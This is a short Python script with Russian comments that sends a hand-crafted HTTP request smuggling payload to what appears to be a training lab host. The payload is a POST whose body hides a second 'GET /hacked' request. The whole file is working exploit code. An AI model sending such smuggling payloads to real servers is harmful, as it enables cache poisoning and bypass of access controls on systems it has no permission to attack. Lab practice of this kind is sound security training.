import socket

HOST = 'lap3-http_request_smuggling_cache_poison.labs-is-here.online'  # Адрес твоего сервера
# HOST = '127.0.0.1'

PORT = 80
# PORT = 8000        # Порт (если Flask dev-сервер, то 5000)

payload = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 11\r\n"
    "\r\n"
    "GET /hacked HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)
#
with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())

